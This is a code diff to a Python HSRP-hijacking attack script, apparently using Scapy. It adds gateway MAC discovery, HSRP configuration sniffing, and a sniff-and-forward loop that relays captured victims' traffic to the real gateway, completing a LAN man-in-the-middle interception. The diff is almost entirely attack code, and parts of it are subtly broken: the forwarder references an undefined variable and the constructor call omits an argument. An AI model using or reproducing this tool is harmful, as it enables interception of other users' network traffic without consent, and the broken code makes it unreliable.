@@ -3,7 +3,7 @@ import threading
 import time
 
 class Attack:
-    def __init__(self, type, iface, srcIP, srcHW, group, priority, vIP, verbose):
+    def __init__(self, type, iface, srcIP, srcHW, group, priority, vIP, verbose, gwIP):
         self.type = type
         self.iface = iface
         self.srcIP = srcIP
@@ -12,6 +12,9 @@ class Attack:
         self.priority = priority
         self.vIP = vIP
         self.verbose = verbose
+        # TO TEST: See if can find gw ip and gw mac
+        self.gwIP = gwIP 
+        self.gwMAC = getmacbyip(gwIP)
 
     def show(self):
         print(f"Attack options: \niface = {self.iface} \nsrcIP = {self.srcIP} \nsrcHW  {self.srcHW} \ngroup = {self.group} \npriority = {self.priority} \nvIP = {self.vIP} \nVerbose = {self.verbose}")
@@ -45,9 +48,20 @@ class Attack:
             sendp(reply)
         return
 
+    def traffic_forwarder(self,packet):
+        toSend = pkt[0]
+        toSend[Ether].dst = self.gwMAC
+        toSend.show()
+        sendp(toSend, iface=self.iface)
+        return
+
     def arp_request_sniffer(self):
         while True:
             sniff(iface = self.iface, count = 1, filter = "arp", prn = self.arp_responder)
+    
+    def traffic_sniffer(self):
+        while True:
+            sniff(iface = self.iface, count = 1, filter = "(tcp or ip or udp or icmp) and not src port 1985 and not broadcast", prn = self.traffic_forwarder)
 
 
 def choose_attack():
@@ -89,6 +103,10 @@ def convert_to_int(string):
 def menu():
     while(True):
         att_choice = choose_attack()
+        print("Sniffing HSRP packet to get configurations...")
+        hsrp_pkt = sniff(filter="udp and src port 1985")
+        #TODO: please test and use the information from the HSRP packet sniffed
+        print("Sniffing complete, Please enter configurations below (enter for default value): ")
         iface = choose_inter()
         srcIP = input("Source IP ("+ get_if_addr(iface)+"): ")
         srcHW = input("Source HW (00:00:0c:07:ac:01): ")
@@ -96,6 +114,7 @@ def menu():
         priority = input("HSRP Priority (250): ")
         vIP = input("HSRP Virtual IP (192.168.1.254): ")
         verbose = input("Verbose? (1): ")
+        gwIP = input("Gateway IP: ")
         if(srcIP == ""):
             srcIP = get_if_addr(iface)
         if(srcHW == ""):
@@ -108,11 +127,13 @@ def menu():
             vIP = "192.168.1.254"
         if(verbose == ""):
             verbose = 1
+        if(gwIP == ""):
+            continue
 
-        print(f"Options: \niface = {iface} \nsrcIP = {srcIP} \nsrcHW  {srcHW} \nroup = {group} \npriority = {priority} \nvIP = {vIP} \nVerbose = {verbose}")
+        print(f"Options: \niface = {iface} \nsrcIP = {srcIP} \nsrcHW  {srcHW} \nroup = {group} \npriority = {priority} \nvIP = {vIP} \nVerbose = {verbose}\n gwIP = {gwIP}")
         confirm = input("Confirm? ==> (1) ")
         if(convert_to_int(confirm) == 1 or confirm == ""):
-            return Attack(att_choice,iface,srcIP,srcHW,group,priority,vIP)
+            return Attack(att_choice,iface,srcIP,srcHW,group,priority,vIP, gwIP)
 
 if __name__  == "__main__":
     attack = menu()
